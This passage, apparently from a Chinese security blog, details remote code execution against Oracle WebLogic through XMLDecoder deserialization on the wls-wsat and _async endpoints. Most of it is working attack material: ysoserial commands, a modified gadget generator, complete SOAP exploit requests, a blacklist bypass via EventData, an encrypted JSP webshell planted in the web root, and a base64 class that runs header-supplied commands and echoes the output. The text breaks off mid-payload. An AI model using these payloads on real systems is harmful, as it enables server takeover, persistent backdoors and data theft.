<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">java.io.ByteArrayInputStream byteIn = new java.io.ByteArrayInputStream(bytes);</span><br><span class="line">ObjectInputStream objectIn = new ObjectInputStream(byteIn);</span><br><span class="line">//bug 4416412: allChangeSets set directly instead of using setInternalAllChangeSets</span><br><span class="line">allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UnitOfWorkChangeSet的参数是一个Byte数组，因此我们需要将Payload转换为Byte[].</p>
<p>利用ysoserial生成Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar Jdk7u21 &quot;cmd /c echo lxhsec &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx.txt&quot; &gt; payload.txt</span><br></pre></td></tr></table></figure>

<p>然后使用下列代码，将Payload进行转换成Byte[]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.beans.XMLEncoder;</span><br><span class="line">import java.io.*;</span><br><span class="line">public class Test&#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">File file = new File(&quot;C:\\Users\\lxhsec\\Downloads\\JRE8u20_RCE_Gadget-master\\exploit.ser&quot;);</span><br><span class="line">//读取ysoserial文件生成的payload</span><br><span class="line">FileInputStream fileInputStream = new FileInputStream(file);</span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((int) file.length());</span><br><span class="line">int buf_size=1024;</span><br><span class="line">byte[] buffer=new byte[buf_size];</span><br><span class="line">int len=0;</span><br><span class="line">while(-1 != (len=fileInputStream.read(buffer,0,buf_size)))&#123;</span><br><span class="line">byteArrayOutputStream.write(buffer,0,len);</span><br><span class="line">&#125;</span><br><span class="line">BufferedOutputStream oop = new BufferedOutputStream(new FileOutputStream(new File(&quot;C:\\Users\\lxhsec\\Downloads\\ysoserial-master\\target\\result.txt&quot;)));</span><br><span class="line">//使用jdk的xmlencoder把byte数组写入到 result.txt</span><br><span class="line">XMLEncoder xmlEncoder = new XMLEncoder(oop);</span><br><span class="line">xmlEncoder.flush();</span><br><span class="line">xmlEncoder.writeObject(byteArrayOutputStream.toByteArray());</span><br><span class="line">xmlEncoder.close();</span><br><span class="line">byteArrayOutputStream.close();</span><br><span class="line">fileInputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拼接Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 178338</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;</span><br><span class="line">//此处填写上面生成的XML。</span><br><span class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>效果:</p>
<p>使用ysoserial生成的只能适用于Windows平台，如果在Linux平台使用，则又要进行一次编译，兼容性有点不太好，因此我们可以<br>将ysoserial稍稍的进行更改。</p>
<p>这里我们将ysoserial的Gadgets.java文件进行更改。路径为：ysoserial-master\src\main\java\ysoserial\payloads\util\Gadgets.java.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span><br><span class="line">throws Exception &#123;</span><br><span class="line">final T templates = tplClass.newInstance();</span><br><span class="line">// use template gadget class</span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">pool.insertClassPath(new ClassClassPath(abstTranslet));</span><br><span class="line">final CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">// ---Start</span><br><span class="line">String cmd = &quot;&quot;;</span><br><span class="line">if(command.startsWith(&quot;filename:&quot;)) &#123;</span><br><span class="line">String filename = command.substring(9);</span><br><span class="line">try &#123;</span><br><span class="line">File file = new File(filename);</span><br><span class="line">if (file.exists()) &#123;</span><br><span class="line">FileReader reader = new FileReader(file);</span><br><span class="line">BufferedReader br = new BufferedReader(reader);</span><br><span class="line">StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">String line = &quot;&quot;;</span><br><span class="line">while ((line = br.readLine()) != null) &#123;</span><br><span class="line">sb.append(line);</span><br><span class="line">sb.append(&quot;\r\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cmd = sb.toString();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">System.err.println(String.format(&quot;filename %s not exists!&quot;, filename));</span><br><span class="line">System.exit(0);</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">// run command in static initializer</span><br><span class="line">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><br><span class="line">cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span><br><span class="line">command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span><br><span class="line">&quot;\&quot;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">System.err.println(cmd);</span><br><span class="line">// ---end</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><br><span class="line">clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><br><span class="line">CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line">final byte[] classBytes = clazz.toBytecode();</span><br><span class="line">// inject class bytes into instance</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;</span><br><span class="line">classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">&#125;);</span><br><span class="line">// required to make TemplatesImpl happy</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><br><span class="line">Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><br><span class="line">return templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存后重新编译mvn clean package -DskipTests.</p>
<p>编译使用的是JDK1.8</p>
<p>修改后的ysoserial，将命令执行，转换成了代码执行。</p>
<p>整个兼容两边平台的代码TestCode.txt。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//TestCode.txt</span><br><span class="line">String WEB_PATH = &quot;servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echolxhsec.jsp&quot;;</span><br><span class="line">String ShellContent = &quot;&lt;%@page import=\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(\&quot;pass\&quot;)!=null)&#123;String k=(\&quot;\&quot;+UUID.randomUUID()).replace(\&quot;-\&quot;,\&quot;\&quot;).substring(16);session.putValue(\&quot;u\&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(\&quot;AES\&quot;);c.init(2,new SecretKeySpec((session.getValue(\&quot;u\&quot;)+\&quot;\&quot;).getBytes(),\&quot;AES\&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;&quot;;</span><br><span class="line">try &#123;</span><br><span class="line">java.io.PrintWriter printWriter = new java.io.PrintWriter(WEB_PATH);</span><br><span class="line">printWriter.println(ShellContent);</span><br><span class="line">printWriter.close();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行：<br>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 “filename:C:\Users\lxhsec\Desktop\TestCode.txt” &gt; result.txt</p>
<p>reuslt.txt转换成Byte[]后执行，如下：</p>
<p>访问:<a href="http://127.0.0.1:7001/_async/echolxhsec.jsp">http://127.0.0.1:7001/_async/echolxhsec.jsp</a></p>
<h6 id="Weblogic-12-1-3-利用利用-org-slf4j-ext-EventData-构造函数执行构造函数执行-readObject"><a href="#Weblogic-12-1-3-利用利用-org-slf4j-ext-EventData-构造函数执行构造函数执行-readObject" class="headerlink" title="Weblogic 12.1.3 利用利用 org.slf4j.ext.EventData 构造函数执行构造函数执行 readObject()."></a>Weblogic 12.1.3 利用利用 org.slf4j.ext.EventData 构造函数执行构造函数执行 readObject().</h6><p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet在Weblogic 12.1.3中不存在，因此需要重新找利用链。</p>
<p>Weblogic的黑名单只会过滤传入的第一层XML，使用org.slf4j.ext.EventData传入的第一层XML是String，因此绕过黑名单检测。</p>
<p>构造函数参考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public EventData(String xml) &#123;</span><br><span class="line">ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());</span><br><span class="line">try &#123;</span><br><span class="line">XMLDecoder decoder = new XMLDecoder(bais);</span><br><span class="line">this.eventData = (Map&lt;String, Object&gt;) decoder.readObject();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">throw new EventException(&quot;Error decoding &quot; + xml, e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造写入文件Payload，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.124.129:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 962</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;</span><br><span class="line">&lt;![CDATA[&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;lxhsecTest&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;</span><br><span class="line">&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>结果:</p>
<h5 id="wls-wsat-war"><a href="#wls-wsat-war" class="headerlink" title="wls-wsat.war"></a>wls-wsat.war</h5><h6 id="Weblogic-10-3-6-回显构造回显构造"><a href="#Weblogic-10-3-6-回显构造回显构造" class="headerlink" title="Weblogic 10.3.6 回显构造回显构造."></a>Weblogic 10.3.6 回显构造回显构造.</h6><p>bea_wls9_async_response.war的反序列化链无法造成回显，但是wls-wsat.war的却可以。</p>
<p>访问：&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>以下测试均在 JDK 1.6.0_45 64bit 下进行。</p>
<p>拿lufei大佬的工具改改。</p>
<p>这里我直接使用lufei的工具，发现 &gt; 等特殊字符，会被当成字符串。</p>
<p>这里将工具的exec函数更改，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">public class ResultBaseExec &#123;</span><br><span class="line">public static String exec(String cmd) throws Exception &#123;</span><br><span class="line">String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">Process p;</span><br><span class="line">if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">//执行命令</span><br><span class="line">// p = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd);</span><br><span class="line">p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">//执行命令</span><br><span class="line">// p = Runtime.getRuntime().exec(&quot;/bin/sh -c &quot; + cmd);</span><br><span class="line">p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;);</span><br><span class="line">&#125;</span><br><span class="line">InputStream fis=p.getInputStream();</span><br><span class="line">InputStreamReader isr=new InputStreamReader(fis);</span><br><span class="line">BufferedReader br=new BufferedReader(isr);</span><br><span class="line">String line=null;</span><br><span class="line">String result = &quot;&quot;;</span><br><span class="line">while((line=br.readLine())!=null)</span><br><span class="line">&#123;</span><br><span class="line">result = result + line;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成.class文件<br>“C:\Program Files\Java\jdk1.6.0_45\bin\javac.exe” C:\Users\lxhsec\Downloads\WeblogicCode\src\main\java\ResultBaseExec.java</p>
<p>接着将.class转换成Base64，当然你转成hex这些也可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sun.misc.BASE64Encoder;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">public class toBase64 &#123;</span><br><span class="line">public static byte[] toByteArray(InputStream in) throws IOException, IOException &#123;</span><br><span class="line">ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">byte[] buffer = new byte[1024 * 4];</span><br><span class="line">int n = 0;</span><br><span class="line">while ((n = in.read(buffer)) != -1) &#123;</span><br><span class="line">out.write(buffer, 0, n);</span><br><span class="line">&#125;</span><br><span class="line">return out.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line">public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">BASE64Encoder base64Encoder = new BASE64Encoder();</span><br><span class="line">//class文件路径</span><br><span class="line">InputStream in = new FileInputStream(&quot;C:\\Users\\lxhsec\\Downloads\\WeblogicCode\\src\\main\\java\\ResultBaseExec.class&quot;);</span><br><span class="line">byte[] data = toByteArray(in);</span><br><span class="line">in.close();</span><br><span class="line">String encode = base64Encoder.encodeBuffer(data);</span><br><span class="line">System.out.println(encode);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq</span><br></pre></td></tr></table></figure>

<p>生成之后使用test_code测试，发现&gt;被解析成了我们想要的。</p>
<p>替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clazz.makeClassInitializer()</span><br><span class="line">.insertAfter(&quot;&quot;</span><br><span class="line">+ &quot;String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\&quot;lfcmd\&quot;);\n&quot;</span><br><span class="line">+ &quot;String R = \&quot;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\&quot;;&quot;</span><br><span class="line">+ &quot;sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();&quot;</span><br><span class="line">+ &quot;byte[] bt = decoder.decodeBuffer(R);&quot;</span><br><span class="line">+ &quot;org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();&quot;</span><br><span class="line">+ &quot;Class cl = cls.defineClass(\&quot;ResultBaseExec\&quot;,bt);&quot;</span><br><span class="line">+ &quot;java.lang.reflect.Method m = cl.getMethod(\&quot;exec\&quot;,new Class[]&#123;String.class&#125;);&quot;</span><br><span class="line">+ &quot;Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n&quot;</span><br><span class="line">+ &quot;outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n&quot;</span><br><span class="line">+ &quot;outputStream.flush();\n&quot;</span><br><span class="line">+ &quot;response.getWriter().write(\&quot;\&quot;);&quot;</span><br><span class="line">+ &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>然后运行JDK7u21,编译生成Byte[], 执行。</p>
<h6 id="Weblogic-12-1-3-回显构造回显构造"><a href="#Weblogic-12-1-3-回显构造回显构造" class="headerlink" title="Weblogic 12.1.3 回显构造回显构造."></a>Weblogic 12.1.3 回显构造回显构造.</h6><p>将</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clazz.makeClassInitializer()</span><br><span class="line">.insertAfter(&quot;&quot;</span><br><span class="line">+ &quot;String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\&quot;lfcmd\&quot;);\n&quot;</span><br><span class="line">+ &quot;String R = \&quot;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEA